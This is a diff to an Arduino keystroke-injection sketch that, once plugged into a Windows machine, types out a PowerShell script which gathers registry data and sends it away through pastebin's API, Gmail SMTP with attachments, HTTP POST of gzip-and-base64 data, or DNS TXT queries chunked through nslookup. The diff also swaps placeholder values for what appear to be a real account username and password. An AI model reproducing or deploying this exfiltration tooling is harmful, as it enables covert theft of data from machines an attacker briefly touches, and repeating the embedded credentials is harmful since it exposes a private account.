@@ -17,8 +17,8 @@ void setup(){
   }
 
   Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Info\" > %temp%\\in.ps1");
-  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\in.ps1");
-  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\in.ps1");
+  Keyboard.println("echo $user = \"vsmittal52\" >> %temp%\\in.ps1");
+  Keyboard.println("echo $pass = \"advocate@papa\" >> %temp%\\in.ps1");
   Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\in.ps1");
   delay(1000);
   Keyboard.println("echo function regv($rk, $rg,$ch) >> %temp%\\in.ps1");
@@ -60,7 +60,29 @@ void setup(){
   Keyboard.println("echo $pv = $o.Replace(\"www\",\"uuu\") >> %temp%\\in.ps1");
 
   String fn = "in";
-  
+   if ("gmail" == "pastebin")
+  {
+    pastebin(fn);
+  }
+  else if ("gmail" == "gmail")
+  {
+    if (fp != "no")
+    {
+        gmail(fn,fp);
+    }
+    else
+    {
+        gmail(fn,"no");
+    }
+  }
+  else if ("gmail" == "post")
+  {
+    hpost(fn);
+  }
+  else if ("gmail" == "dns")
+  {
+    dns(fn);
+  }
 
 
   Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\in.vbs");
@@ -238,4 +260,159 @@ void send_left_enter(){
   }
 
 
-  
+  void post(String filename)
+{
+    Keyboard.print("echo function pht($url,$pars) { >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $ht = New-Object -ComObject Msxml2.XMLHTTP >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $ht.open(\"POST\", $url, $false) >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $ht.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\") >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $ht.setRequestHeader(\"Content-length\", $pars.length); >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $ht.setRequestHeader(\"Connection\", \"close\") >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $ht.send($pars) >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $script:sk=$ht.responseText }>> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+}
+
+void compress_encode(String filename)
+{
+    Keyboard.print("echo $r = [string]::Join(\"`n\", $pv) >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $ms = New-Object IO.MemoryStream >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress) >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $sw = New-Object System.IO.StreamWriter($cs) >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $sw.Write($r) >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $sw.Close() >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $code = [Convert]::ToBase64String($ms.ToArray()) >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $code >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+}
+
+void pastebin(String filename)
+{
+    post(filename);
+    Keyboard.print("echo pht \"https://pastebin.com/api/api_login.php\" \"api_dev_key=$dev&api_user_name=$user&api_user_password=$pass\" >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo pht \"https://pastebin.com/api/api_post.php\" \"api_user_key=$sk&api_option=paste&api_dev_key=$dev&api_paste_name=$pn&api_paste_code=$pv&api_paste_private=2\" >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+}
+
+void gmail(String filename, String filepath)
+{
+    Keyboard.print("echo $srv = \"smtp.gmail.com\" >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $msg = new-object Net.Mail.MailMessage >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $st = new-object Net.Mail.SmtpClient($srv) >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $st.EnableSsl = $True >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $st.Credentials = New-Object System.Net.NetworkCredential(\"$user\", \"$pass\"); >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $msg.From = \"$user@gmail.com\" >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $msg.To.Add(\"$user@gmail.com\") >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $msg.Subject = $pn >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $msg.Body = $pv >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    if (filepath != "no"){
+
+        Keyboard.print("echo $att = new-object Net.Mail.Attachment(\"");
+        Keyboard.print (filepath);
+        Keyboard.print ("\") >> %temp%\\");
+        Keyboard.print(filename);
+        Keyboard.println(".ps1");
+        Keyboard.print("echo $msg.Attachments.Add($att) >> %temp%\\");
+        Keyboard.print(filename);
+        Keyboard.println(".ps1");
+    }
+    Keyboard.print("echo $st.Send($msg) >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+}
+
+void hpost (String filename)
+{
+    compress_encode(filename);
+    post(filename);
+    Keyboard.print("echo pht $user $code >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+}
+
+void dns (String filename)
+{
+    compress_encode(filename);
+    Keyboard.print("echo $lstr = 0 >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $qrs = [int]($code.Length/63) >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo while ($qrs -ne 0){ >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $qs = $code.Substring($lstr,63) >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo Invoke-Expression \"nslookup -querytype=txt $qs.$user $pass\" >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $lstr += 63 >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $qrs -= 1 } >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $mod = $code.Length%63 >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $qr = $code.Substring($code.Length - $mod, $mod) >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo Invoke-Expression \"nslookup -querytype=txt $qr.$user $pass\" >> %temp%\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+}
+
